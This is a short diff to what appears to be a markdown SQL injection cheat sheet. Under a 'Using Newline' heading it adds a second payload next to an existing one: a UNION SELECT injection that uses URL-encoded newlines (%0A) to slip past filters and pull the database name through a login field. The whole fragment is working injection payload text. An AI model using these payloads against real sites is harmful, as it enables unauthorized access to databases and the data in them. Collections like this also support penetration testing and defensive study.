@@ -16,6 +16,8 @@
 *Using Newline*
 ```sql
 admin %0A union %0A select %0A 1,database()#
+           or
+admin %0A union %0A select %0A database(),2#   
 ```
 
 
